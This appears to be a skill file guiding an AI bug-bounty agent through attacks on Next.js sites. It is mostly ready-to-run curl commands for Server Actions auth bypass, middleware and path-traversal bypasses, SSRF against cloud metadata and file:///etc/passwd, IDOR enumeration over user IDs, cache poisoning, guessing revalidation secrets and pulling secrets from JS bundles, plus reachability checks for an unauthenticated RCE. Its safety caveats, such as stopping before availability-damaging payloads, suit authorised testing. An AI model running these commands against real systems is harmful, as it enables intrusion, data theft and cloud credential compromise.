---
name: hunt-nextjs
description: "TRIGGER — target fingerprints as Next.js 13/14/15 (`_next/` paths, `x-powered-by: Next.js`, RSC payloads). Covers Server Actions, Middleware auth-bypass via static-asset paths, ISR cache poisoning, `/_next/image` SSRF. SKIP — hunt-nodejs for generic Node/Express bugs not specific to the Next.js routing/rendering layer; hunt-cache-poison for CDN-level (not ISR-level) cache poisoning."
sources: "cve_database (CVE-2024-34351 / GHSA-fr5h-rqp8-mj6g), Next.js advisories"
report_count: 0
---

# HUNT-NEXTJS — Next.js / SSR Framework Vulnerabilities

## Crown Jewel Targets

Next.js-specific bugs that bypass auth or reach SSRF = High/Critical.

**Highest-value chains:**
- **Server Actions auth bypass** — Server Actions enforce auth client-side only → call action ID directly → unauthorized data mutation or exfil
- **Middleware bypass via `/_next/static/`** — middleware skips static asset paths → protected routes accessible via `/_next/data/` IDOR
- **`/_next/image` SSRF** — Image optimizer fetches attacker-controlled URL → internal network scan or cloud metadata
- **ISR stale cache poisoning** — inject malicious content into a cached page that gets served to all users
- **RSC payload leakage** — React Server Component flight data contains server-side props not meant for client

---

## Attack Surface Signals

```
/_next/image?url=&w=&q=          Image optimizer — SSRF candidate
/_next/data/BUILD_ID/*.json      Prerendered page data — IDOR candidate
/__nextjs_original-stack-frame   Debug stack frame endpoint
/_next/static/chunks/            JS bundles — source map candidate
/api/                            API routes — standard hunt surface
__NEXT_DATA__ in HTML            SSR props leaked to client
x-nextjs-* response headers      Confirms Next.js
```

---

## Phase 1 — Fingerprint & Version Detection

```bash
# Confirm Next.js and get build ID
curl -s https://$TARGET/ | grep -oP '"buildId":"[^"]+"'
curl -sI https://$TARGET/ | grep -i "x-powered-by\|x-nextjs"

# Extract build ID for /_next/data/ paths
BUILD_ID=$(curl -s https://$TARGET/ | grep -oP '"buildId":"\K[^"]+')
echo "Build ID: $BUILD_ID"

# Check Next.js version via package disclosure
curl -s https://$TARGET/_next/static/chunks/framework*.js | grep -oP '"next":"[^"]+"'

# Source map exposure
curl -s "https://$TARGET/_next/static/chunks/pages/index.js.map" | head -5
curl -s "https://$TARGET/_next/static/chunks/main.js.map" | head -5
```

---

## Phase 2 — Server Actions Abuse

```bash
# Server Actions in Next.js 14+ use x-action-id or Next-Action header
# Find action IDs in HTML source or JS bundles
curl -s https://$TARGET/ | grep -oP '"action":"[a-f0-9]+"'
grep -r "createActionURL\|$$ACTION_" recon/$TARGET/ --include="*.js" 2>/dev/null

# Call Server Action directly without auth
curl -s -X POST https://$TARGET/target-page \
  -H "Next-Action: ACTION_ID_HERE" \
  -H "Content-Type: multipart/form-data; boundary=----" \
  -H "Cookie: " \
  --data-raw $'------\r\nContent-Disposition: form-data; name="1"\r\n\r\n[]\r\n------\r\n'

# Test: does the action execute without a valid session?
# If it returns data or mutates state → auth enforcement is client-side only
```

---

## Phase 3 — Middleware Auth Bypass

```bash
# Next.js middleware runs on edge runtime and may skip certain paths
# Test protected route directly
curl -s -o /dev/null -w "%{http_code}" https://$TARGET/admin/dashboard
# → 200 means accessible

# Test via /_next/data/ (SSG/ISR JSON) — middleware may not apply
curl -s "https://$TARGET/_next/data/$BUILD_ID/admin/dashboard.json"

# Test via static asset path prefix (middleware matcher may exclude /_next/static)
curl -s "https://$TARGET/_next/static/../admin/dashboard"

# Encoded path bypass
curl -s "https://$TARGET/%5Fnext/data/$BUILD_ID/admin/users.json"
curl -s "https://$TARGET/_next/data/$BUILD_ID/..%2Fadmin%2Fusers.json"
```

---

## Phase 4 — Image Optimization SSRF (`/_next/image`)

```bash
# Basic SSRF test — internal metadata
curl -s "https://$TARGET/_next/image?url=http://169.254.169.254/latest/meta-data/&w=64&q=75"

# Protocol bypass attempts
curl -s "https://$TARGET/_next/image?url=file:///etc/passwd&w=64&q=75"
curl -s "https://$TARGET/_next/image?url=http://127.0.0.1:6379/&w=64&q=75"

# OOB detection — use a UNIQUE per-test subdomain so callbacks can't be confused
COLLAB="http://UNIQUE.COLLAB_HOST"
curl -s "https://$TARGET/_next/image?url=$COLLAB/nextjs-ssrf&w=64&q=75"
# Check Interactsh/Burp Collaborator for DNS/HTTP callback on that exact subdomain
```

**FALSE-POSITIVE GUARD (read before claiming SSRF):** `/_next/image` only
fetches URLs allowed by `images.remotePatterns` / `images.domains` in
`next.config.js`. A non-whitelisted `url` returns **400 by default** — that is
the optimizer's normal allowlist rejection, NOT a "block" you bypassed. A **200**
returns an *optimized image*, not the upstream response body, so a status code
alone NEVER confirms SSRF. Confirm only via an **out-of-band callback to a unique
Collaborator subdomain** (above), or by body-diffing a known-internal vs
known-external target. Do not report on status code.

> Note: CVE-2024-34351 (Next.js SSRF, GHSA-fr5h-rqp8-mj6g, affects 13.4.0
> through < 14.1.1, fixed in 14.1.1) is a **Server Actions** SSRF — a relative
> redirect that trusts the `Host` header — NOT a `/_next/image` bug, and it does
> NOT affect Host-routed providers like Vercel. See Phase 2 for the Server
> Actions surface.

---

## Phase 5 — `/_next/data/` IDOR & Data Leakage

```bash
# Enumerate prerendered JSON for user-specific data
# Pattern: /_next/data/BUILD_ID/[page].json or /_next/data/BUILD_ID/[dynamic]/[id].json
curl -s "https://$TARGET/_next/data/$BUILD_ID/profile.json" \
  -H "Cookie: session=VICTIM_SESSION"

# Try other users' data
for ID in 1 2 3 100 1000; do
  curl -s "https://$TARGET/_next/data/$BUILD_ID/users/$ID.json" | head -3
done

# Check __NEXT_DATA__ in HTML for sensitive server-side props
curl -s "https://$TARGET/dashboard" | \
  python3 -c "import sys,re,json; m=re.search(r'<script id=\"__NEXT_DATA__\"[^>]*>(.*?)</script>',sys.stdin.read(),re.S); print(json.dumps(json.loads(m.group(1)),indent=2) if m else 'not found')"
```

---

## Phase 6 — ISR Cache Poisoning

```bash
# ISR pages regenerate on request after revalidation period
# If user input influences the static page content without sanitization:
# 1. Trigger revalidation with malicious input in URL/query
# 2. Injected content cached and served to all users

# Test: does query param affect cached page content?
# Use a UNIQUE marker (not a generic <script>) so a match proves YOUR input landed,
# and confirm the response was actually CACHED + served to a DIFFERENT client.
MARK="zqx$(date +%s)"
# 1) Poison with the marker
curl -s "https://$TARGET/blog/test-post?preview=<b>$MARK</b>" -o /dev/null
# 2) Re-fetch the CLEAN url (no query) from a fresh client and grep the marker.
#    Body-diff clean-vs-poisoned and check x-nextjs-cache / age headers — a reflected
#    marker WITHOUT proof it persists in the cache key is just reflection, not poisoning.
curl -si "https://$TARGET/blog/test-post" | grep -iE "$MARK|x-nextjs-cache|age:"

# On-demand revalidation endpoint (if exposed)
curl -s "https://$TARGET/api/revalidate?secret=GUESS&path=/blog/test"
curl -s "https://$TARGET/api/revalidate?token=GUESS&path=/admin"
```

---

## Phase 7 — Debug & Stack Frame Endpoints

**Precondition:** `__nextjs_launch-editor` and `__nextjs_original-stack-frame`
are react-dev-overlay middleware mounted ONLY under `next dev`. A production
build (`next build && next start`) does not register these routes — a 404 here
is the normal, expected result, not a "filter" you need to bypass. They are
reachable ONLY in the rare misconfiguration of literally running `next dev` in
production. Treat any non-404 as the real finding; do NOT report a 404/filtered
response as confirmation.

```bash
# First confirm dev mode is actually exposed (anything but 404 = dev server in prod)
curl -s -o /dev/null -w "%{http_code}" \
  "https://$TARGET/__nextjs_original-stack-frame?isServer=true&errorMessage=test"

# Only if the above is NOT 404: the launch-editor / stack-frame endpoints can
# reference local files (file-read surface of a dev server wrongly exposed)
curl -s "https://$TARGET/__nextjs_launch-editor?file=../../etc/passwd&line=1"
curl -s "https://$TARGET/__nextjs_original-stack-frame" \
  --data '{"file":"/etc/passwd","line":1,"column":1}'
```

---

## Phase 8 — Environment Variable Leakage

```bash
# NEXT_PUBLIC_* vars are baked into JS bundles — grep for secrets
curl -s "https://$TARGET/_next/static/chunks/pages/_app.js" | \
  grep -oE "NEXT_PUBLIC_[A-Z_]+['\"]?\s*[:=]\s*['\"]?[^'\"&\s]+"

# Check for non-public vars accidentally exposed
curl -s https://$TARGET/ | python3 -c "
import sys, re, json
m = re.search(r'__NEXT_DATA__.*?({.*?})</script>', sys.stdin.read(), re.S)
if m:
    d = json.loads(m.group(1))
    print(json.dumps(d.get('props', {}), indent=2))
"
```

---

## Phase 9 — RSC Flight payload framing (GHSA-673q-mjm6-r5xr)

Added 2026-11-13 from the operator's technique digest. **Read the advisory before the
first payload** — the digest gives the mechanic, not the byte layout, and a framing bug
is the one class where a wrong guess costs availability instead of proving anything.

The mechanic as described: the React Flight format a Server Component response is
serialised in is parsed by the server too (Server Actions, `POST` with
`Content-Type: text/x-component`, and the `?_rsc=` render path). A payload that
describes **several typed-array views over one `ArrayBuffer`** makes the parser hand
out overlapping views of the same bytes, and the deserialiser then reconstructs an
object graph the application never meant to exist — the writeup's end state is code
execution with no session at all.

**Which identifier applies is a read, not a memory.** The digest names
`GHSA-673q-mjm6-r5xr` and says no CVE exists; this workspace's own corpus
(`docs/disclosed-reports/corpus-2026-11-13/known-urls.txt`) carries a detection write-up
for an RSC Next.js RCE naming **CVE-2025-55182 and CVE-2025-66478**. They may be the same
bug under two identifiers or two different bugs — open both and compare the affected
ranges against the version you measured before deciding this host is in range.

Why this is worth a request on a Next.js host: it needs no account, and the two
preconditions are readable without sending a payload.

```bash
# 1) Version. The advisory's affected range is what decides whether to go further --
#    read it, then compare. Do NOT fire a framing payload at a version outside it.
CBH_PROJECT=$P bbcurl -s "https://$TARGET/" | grep -oP '"buildId":"\K[^"]+'
CBH_PROJECT=$P bbcurl -s "https://$TARGET/_next/static/chunks/framework"*.js \
  | grep -oE '"(next|react-server-dom-webpack)":"[^"]+"'

# 2) Is the Flight parser reachable unauthenticated? A 200/4xx that is a FLIGHT
#    response (not an HTML error page) proves the server parsed the request as RSC.
CBH_PROJECT=$P bbcurl -si "https://$TARGET/?_rsc=0000" \
  | grep -iE "^(content-type|x-nextjs|vary):"
# text/x-component => the parse surface is live without a cookie.

# 3) Server Action entry point, jarless (Phase 2 finds the action id):
CBH_PROJECT=$P bbcurl -si -X POST "https://$TARGET/" \
  -H "Next-Action: $ACTION_ID" -H "Content-Type: text/plain;charset=UTF-8" \
  --data-raw '[]' | head -20
```

Stop at reachability. The framing payload itself goes to `blocked-tests/` with the
version reading, the `content-type: text/x-component` capture and `**Park:** availability`
declared: a parser confusion that lands wrong takes the host down, which is forbidden on
every engagement here and is not a permission the operator can give (`cbh autonomy`).

**Chain:** needs `nextjs-version-in-range`, `flight-parser-unauthenticated` · gives
`unauth-rce-candidate`

---

## Chain Table

| Next.js finding | Chain to | Impact |
|----------------|----------|--------|
| Server Action no auth | Call privileged mutations directly | Data manipulation / admin access |
| `/_next/image` SSRF | Cloud metadata → IAM creds | Cloud compromise |
| `/_next/data/` IDOR | Other users' server-side props | PII / token exfil |
| Middleware bypass | Protected admin routes | Auth bypass |
| Source map exposed | Reconstruct TS source → find hardcoded secrets | Further vulns |
| `__NEXT_DATA__` leaks | Server-side secrets in HTML | API keys / tokens |
| Flight parser reachable jarless | Advisory-range version → framing payload | Unauth RCE (approval first) |

---

## Validation

✅ Server Action: action executes without valid session, returns data or mutates state
✅ SSRF: DNS/HTTP callback received from `/_next/image` SSRF
✅ Middleware bypass: 200 response on protected route without auth cookie
✅ Data leak: `__NEXT_DATA__` contains non-public secrets or other users' PII
✅ Flight parse surface: `content-type: text/x-component` on a jarless request, and the
   version read in Phase 9 sits inside the advisory's affected range

**Severity:**
- Server Action auth bypass → data mutation: High/Critical
- Image SSRF → cloud metadata: Critical
- Middleware bypass → admin panel: High
- Source map exposure only: Low-Medium

---

## Cache Components (`use cache`) — identity confusion, not key confusion

Seven Next.js advisories shipped 3 November 2026 and six of them are the cache. Patched in
**16.4.5** (Active LTS) and **15.5.29** (Maintenance LTS); confirm each range at its GHSA rather
than from any write-up, including this one.

Two arms are deterministic and belong here. Both are about the **identity** a cached entry is
stored under, which is computed from the function's arguments — a different question from the CDN
cache *key* that `hunt-cache-poison` owns.

**Colliding identity for distinct arguments — GHSA-rhh4-g77r-r9qj / CVE-2026-119349.** "Distinct
binary arguments passed to a `use cache` function can produce the same cache identity." So find a
cached function reached with argument types the identity hash flattens — a Buffer or typed array,
a `Date`, a class instance, anything whose serialization is lossy — and call it twice with values
that differ only in the flattened part. One caller's result is served to the other. This is a
hashing bug, not a race: two sequential requests show it.

**Nested `use cache` storing before the inner scope is recorded — GHSA-vc7v-qv4w-wrv8 /
CVE-2026-119351.** "The outer entry can be stored before the inner function's root-parameter
dependencies are recorded," disclosing "tenant-, site-, or locale-specific content." Hold the
outer function's arguments still and vary only the inner scope (tenant, site, locale, user). If
the outer entry was stored first, the second caller gets the first caller's inner content.

**Excluded on purpose: the cold-fill race, CVE-2026-119790.** "During a cold cache fill, a
concurrent call through `unstable_cache` can receive another request's result without checking
its root parameters", and that result "can then be stored and served to later callers". Real, and
the most serious of the set — and it needs concurrent requests against a live target, which is
blast radius on other users and on availability. It is not in the mutation matrix, and it is not
tested here. If the stack and version match, write it up as a version-based finding and park the
exploitation with `**Park:** availability`.

**Also in the same release, not cache bugs:** CVE-2026-119350 (shared shell cache poisoning,
self-hosted `next start` only — persistent 404s and wrong SSR content, *not* cross-tenant
content), CVE-2026-119348 (cross-client response injection via stale compression framing, needs an
HTTP/1.1 reverse proxy with pipelining), CVE-2026-119347 (an image misclassified as AVIF bypasses
`images.dangerouslyAllowSVG: false`; the source allowlist still holds), CVE-2026-119346
(`HttpOnly` cookie readable by same-origin JS through the internal `x-middleware-set-cookie`
header, Edge route handlers using `NextResponse.cookies.set()`).

**SKIP** — `hunt-cache-poison` for CDN/edge key manipulation, which is a different layer.

